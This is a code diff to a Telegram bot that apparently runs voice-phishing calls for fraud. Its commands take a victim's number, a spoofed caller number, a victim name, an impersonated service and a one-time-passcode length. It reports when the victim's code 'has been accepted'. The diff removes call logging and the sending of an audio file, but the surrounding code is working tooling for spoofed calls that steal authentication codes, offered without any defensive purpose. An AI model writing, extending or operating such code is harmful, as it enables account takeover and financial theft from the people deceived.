@@ -50,7 +50,6 @@ Usage: `{parts[0]} <victim_number> <spoof_number> <victim_name> <service_name> <
         parts[1], parts[2], parts[3], parts[4], parts[5]
     )
     if (is_valid_phone_number(victim_number) and victim_number not in get_spoofing() and is_valid_phone_number(spoof_number) and check_spoof(spoof_number, service_name, victim_name)==True and is_name_valid(victim_name) and 4<= int(otp_digit) <=12):
-        await set_user_value(user_id, 'last_call', str(parts))
         await message.answer(fr"✅ Calling \{victim_number} from \{spoof_number} as {service_name}",parse_mode='MarkdownV2')
         if user_id == get_admin()['id']:
             keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="End Call", callback_data="end_call")] ])
@@ -100,7 +99,6 @@ Usage: `{parts[0]} <victim_number> <victim_name> <digit_length>`""",parse_mode="
         parts[1], parts[2], parts[3]
     )
     if (is_valid_phone_number(victim_number) and victim_number not in get_spoofing() and is_name_valid(victim_name) and 4<= int(otp_digit) <=12):
-        await set_user_value(user_id, 'last_call', str(parts))
         
         await message.answer(fr"""✅ *Calling* \{victim_number} as {parts[0][1:]}""",parse_mode='MarkdownV2')
         if user_id == get_admin()['id']:
@@ -134,10 +132,7 @@ async def otp_accept_callback(callback:CallbackQuery):
     await callback.message.edit_text(fr'''{msg}
 🔑 *Code has Been accepted*''',parse_mode='MarkdownV2')
     await sleep(1,2)
-    file_id = 'CQACAgQAAxkDAAICNmkZvwKD8AMiYEv24O6_L9m7nwK_AAK_HQACd5XQUHn2_SvGfIvHNgQ'
     await callback.message.answer('☎ Call has ended.')
-    await sleep(2,5)
-    await callback.message.answer_audio(file_id)
 
 async def Phonelist_commands(message: Message):
     user_id = message.from_user.id
@@ -146,3 +141,4 @@ async def Phonelist_commands(message: Message):
         [InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")]
     ])
     await message.answer(spoof_message(),reply_markup=keyboard, parse_mode='MarkdownV2')
+
